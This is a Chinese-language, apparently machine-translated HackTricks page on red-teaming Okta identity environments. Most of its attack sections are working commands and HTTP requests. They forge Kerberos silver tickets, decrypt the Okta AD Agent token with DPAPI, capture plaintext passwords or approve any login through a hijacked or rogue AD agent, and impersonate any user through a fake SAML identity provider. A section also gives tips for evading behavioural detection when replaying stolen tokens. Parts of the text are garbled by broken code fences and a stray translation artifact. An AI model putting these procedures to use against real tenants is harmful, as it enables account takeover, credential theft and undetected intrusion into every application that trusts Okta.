# Okta 安全性

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

Okta, Inc. 是一家**身份和访问管理公司**，提供云软件帮助公司**管理和保护用户对现代应用程序的认证**，以及帮助开发者在应用程序、网站网络服务和设备中构建身份控制。

他们的核心服务，称为 Okta 身份云，提供的产品包括单点登录（SSO）、多因素认证（MFA）、生命周期管理、通用目录、API 访问管理等。这有助于公司保护其敏感数据，并简化用户访问，使应用程序和服务对员工或客户更加可访问和易于使用。

Okta 的服务在企业环境中广泛使用，也被较小的公司和开发者使用。它在帮助企业安全采用和管理云技术方面发挥着至关重要的作用。截至我在 2021 年 9 月的知识截止点，Okta 仍然是身份和访问管理（IAM）行业的重要参与者。

{% hint style="danger" %}
Okta 的主要目标是配置不同用户和组对外部应用程序的访问。如果您设法在 Okta 环境中**危害管理员权限**，您很可能能够**危害公司使用的所有其他平台**。
{% endhint %}

{% hint style="success" %}
要对 Okta 环境进行安全审查，您应该要求**管理员只读访问权限**。
{% endhint %}

### 摘要

有**用户**（可以**存储在 Okta 中**，从配置的**身份提供者**登录或通过**活动目录**或 LDAP 认证）。\
这些用户可以在**组**内。\
还有**认证器**：不同的认证选项，如密码，以及几种 2FA，如 WebAuthn、电子邮件、电话、okta verify（它们可能启用或禁用）...

然后，有与 Okta 同步的**应用程序**。每个应用程序都会与 Okta 有一些**映射**来共享信息（如电子邮件地址、名字...）。此外，每个应用程序必须在一个**认证策略**内，该策略指示用户访问应用程序所需的**认证器**。

{% hint style="danger" %}
最强大的角色是**超级管理员**。

如果攻击者以管理员身份危害 Okta，所有**信任 Okta 的应用程序**很可能会被**危害**。
{% endhint %}

## 攻击

### 定位 Okta 门户

通常，公司的门户网站将位于 **companyname.okta.com**。如果不是，尝试简单的**公司名称变体**。如果您找不到，也有可能组织有一个像 **`okta.companyname.com`** 的**CNAME**记录指向**Okta 门户**。

### 通过 Kerberos 登录 Okta

（攻击复制[**从这里**](https://trustedsec.com/blog/okta-for-red-teamers)）。

如果像 **`companyname.kerberos.okta.com`** 这样的域存在，则在公司内配置了 kerberos 以访问 Okta。这非常有趣，因为通常 Windows 用户不需要 MFA 就可以访问 Okta。

也可以在 AD 环境中运行以下命令找到配置了 Okta 访问权限的 Kerberos 用户：
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
在为AD用户检索到票据后，我们需要使用Rubeus或Mimikatz将其注入我们控制的主机：

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

您需要确保`clientname.kerberos.okta.com`被添加到Internet选项中的“内网”安全区域。然后，在我们的浏览器中，如果我们访问下面的URL，我们应该会发现当Kerberos票据被接受时，我们会收到一个提供`OK`结果的JSON响应：

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

前往Okta仪表板，如果一切正常，您将被登录。

此外，如果我们能够攻破实际的Okta服务账户，暴露出委派SPN，我们可以执行Silver Ticket攻击。

应该注意的是，由于Okta仅支持AES用于票据加密，我们需要确保我们拥有AES密钥或明文密码以进行认证：

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

为了为受害用户`testuser`制作我们的票据，我们使用：

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
```markdown
{% endcode %}

再次，通过我们的浏览器会话将此内容发送给Okta：

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 劫持Okta AD代理

（攻击复制[**自此处**](https://trustedsec.com/blog/okta-for-red-teamers)）。

如果你访问运行Okta AD代理的服务器。该代理负责将域用户和组同步到Okta以进行配置，并且在用户登录门户时响应Okta的认证请求。

默认情况下，代理安装在：
```
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
我们将查看 `OktaAgentService.exe.config`，其中包含一些有趣的XML片段：

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Base64编码的`AgentToken`是我们关注的焦点。如果我们在dnSpy中打开`OktaAgentService.exe`，我们可以看到这些值是如何被解密的：

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

没错...正是老朋友DPAPI！`RandomEntropy`的值被设置为：

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

这意味着我们可以使用以下方法解密这个Base64编码的XML值：
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
DPAPI 主密钥属于运行“Okta AD Agent”服务的用户账户，因此您需要在服务账户的上下文中运行上述操作，或获取该账户的主密钥并解密：

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

例如，在 `OktaAgentService.exe.config` 中，我们有两个进一步的 XML 字段，`APPID` 和 `AGENTID`。结合 `AgentToken`，我们可以按照以下方式发起一个 `GET` 请求：
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
此调用将阻塞，直到用户完成对Okta的认证（或请求超时），此时它将以明文形式返回下一个提供的用户名和密码：
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
```markdown
虽然这允许捕获凭证，我们也有机会回应这一认证尝试，如果我们想做类似提供万能钥匙的事情。我们通过发出以下HTTP请求来做到这一点：
```
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
发出此请求的结果是允许通过Okta对任何用户进行认证。

### 劫持AD管理员权限

（攻击复制[**自此处**](https://trustedsec.com/blog/okta-for-red-teamers)）。

我们知道，如果我们拥有一个被盗的Agent Token，我们可以劫持Okta AD代理，但如果我们已经侵入了一个具有特权的Okta账户，并且想要在没有现有代理令牌的情况下执行此操作呢？让我们看看如何做到这一点。

首先，我们需要创建一个Okta AD代理API令牌。为了启动认证流程，我们需要一个OAuth Code。要获取这个，我们首先前往：

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
```markdown
{% endcode %}

这将给你一个权限提示，你需要接受：

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

接受显示的提示将会重定向到 `/oauth-response` 并附带一个 `code` 参数：

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

我们需要拿到这个 `code` 参数并使用 POST 请求来请求一个 API 令牌：
```
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
响应返回给我们我们的API令牌：
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
```markdown
使用这个令牌，我们需要将它与一个活跃的AD域关联起来。我们通过以下API调用来实现：
```
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
这将返回以下XML响应，我们需要保留`id`属性值以供稍后使用
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
接下来，我们发起一个HTTP API调用来命名我们的连接器：
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
```xml
<user id="00u5t60iloOHN9pBi0h7">
    <!-- ... 其他 XML 数据 ... -->
</user>
```
{% endcode %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```markdown
最后，我们初始化连接以允许接收数据：
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
完成这些操作后，我们的假冒AD代理现在已经准备就绪，并将按照之前所示处理认证尝试。

显然，我们不想使用Burp来完成所有这些操作，因此已经创建了一个工具来支持一些用例。该工具可以从[这里](https://github.com/xpn/OktaPostExToolkit)获取。

我们可以在`token`模式下运行此工具，它会接收一个被泄露的Agent Token值，并将连接到Okta API，转储它接收到的任何凭据：

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
视频示例：

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

如果我们有Okta用户的管理凭证，该工具还允许注册一个新的AD连接器：

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta 伪造 SAML 提供商

(攻击复制[**自此处**](https://trustedsec.com/blog/okta-for-red-teamers))。

在评估中非常有用的另一种技术是部署一个伪造的 SAML 提供商。

最近，Okta 实际上提供了[一项安全更新](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection)，关于采用这种技术的实战攻击，所以当在环境中模拟活动时，了解这一点是非常有用的，特别是对于那些希望测试对这种特定攻击的检测的客户。

如果我们持有一个高级的 Okta 账户，我们可以作为 Okta 功能的一部分部署一个外部身份提供商。这允许像 Entra ID 这样的外部提供商完成认证，然后将用户重定向到 Okta 选择集成的应用程序。

但是，如果我们控制了 IDP 呢？显然，在这种情况下，我们可以批准我们想要的任何认证请求。

为了测试这一点，我们需要部署一个自定义的身份提供商。一个非常简陋的支持我们不法活动的 SAML IDP 可以在[这里](https://github.com/xpn/OktaPostExToolkit)找到。这个工具背后的核心思想是允许我们发出签名的 SAML 认证响应，这些响应对应于我们喜欢的任何用户。

这个服务器将在 `/saml` 上监听传入的 HTTP 请求，所以我们首先需要向 Okta 部署一个 IDP。

首先，我们选择 SAML 2.0 IDP：

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

在配置 IDP 时，我们需要注意一些设置。第一个是 `Name`，这是要显示给 Okta 的其他管理员的友好名称。

接下来是发行者 URL，应该设置为 URI 格式的标识符的值。这又可以是任何东西，但我们将使用 `https://www.example.com/`。

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

我们还需要设置 `IdP 单点登录 URL` 字段，指向我们的 SAML 服务器正在运行的位置。现在，酷的是这个 URL 不需要指向我们的服务器。我觉得值得指出这一点，因为我们可以在这里输入的 URL 上变得相当有创意，让蓝队的工作变得更难一些。例如，如果我们愿意，我们可以将这个字段设置为像 `https://idp.google.com/saml` 这样的东西，我们唯一需要做的就是能够捕获传入的 SAML 请求。这里有个酷事：SAML 请求是客户端转发的。我的意思是，Okta 将生成 SAML `AuthRequest` 并让我们的浏览器重定向到 `https://idp.google.com/` 以及 SAML 请求。当然，这意味着我们可以简单地修改本地 hosts 文件，将 `idp.google.com` 指向 `127.0.0.1`：
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
我们还需要一个我们控制的签名证书。这可以是自签名的，并且可以使用OpenSSL生成：

{% code overflow="wrap" %}
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
```markdown
{% endcode %}

再次，您可以在此发挥创意，因为没有具体要求证书的真实性。

密钥生成后，我们只需将证书上传到Okta并创建我们的IDP。

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

最后，我们需要确保`Match Against`设置为`Okta Username or Email`，并且`Account Link Policy`设置为`Automatic`，以允许我们对现有Okta账户进行认证：

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

保存所有设置后，我们需要下载元数据：

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

然后，为了发起认证请求并发出`AuthRequest`，我们导航到`Assertion Consumer Service URL`中显示的URL：

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

导航到此URL会导致重定向到我们的内部SAML服务器：

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

如果我们提供一个电子邮件地址，我们会发现我们可以作为任何Okta用户进行认证，而无需知道他们的凭据。

让我们在实际操作中看看这个过程 [https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)

### 使用Evilgnix对Okta门户进行网络钓鱼

在[**这篇博客文章**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)中解释了如何针对Okta门户准备网络钓鱼活动。

### 同事冒充攻击

用户可以拥有和修改的**属性**（如电子邮件或名字）可以在Okta中配置。如果一个**应用程序**将用户可以**修改**的**属性**作为ID**信任**，他将能够**在该平台上冒充其他用户**。

因此，如果应用程序信任字段**`userName`**，你可能无法更改它（因为你通常不能更改该字段），但如果它信任例如**`primaryEmail`**，你可能能够**将其更改为同事的电子邮件地址**并冒充他（你需要能够访问该电子邮件并接受更改）。

请注意，这种冒充取决于每个应用程序的配置方式。只有信任你修改的字段并接受更新的应用程序才会受到影响。\
因此，如果应用程序存在此字段，应启用它：

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

我也看到其他应用程序存在漏洞，但在Okta设置中没有该字段（最终不同的应用程序配置不同）。

找出你是否可以在每个应用程序上冒充任何人的最佳方法是尝试！

## 规避行为检测策略 <a href="#9fde" id="9fde"></a>

除非事先披露，否则你可能不会知道是否实施了行为检测策略，直到你遇到它们。一种**可能绕过Okta行为**检测策略的方法是简单地**避开主Okta仪表板**，直接针对Okta应用程序（这将是上面截图中被红色框遮住的应用程序）。如果你拥有Okta访问令牌，而不是在目标公司的主Okta登录页面重放令牌，你应该在特定应用程序的Okta URL处重放令牌。

其他建议包括：

* 小心从流行的匿名代理和VPN服务重放捕获的访问令牌。
* 重放访问令牌时，使用客户端使用的相同用户代理字符串。
* 小心从同一IP地址的不同用户重放捕获的访问令牌。
* 小心针对Okta仪表板重放捕获的访问令牌。
* 如果你知道受害者将使用的公司IP地址，请考虑阻止除该IP或IP范围之外的所有其他流量。

## Okta加固

Okta有很多可能的配置，在这个页面你会发现如何审查它们，使它们尽可能安全：

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## 参考资料

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
```
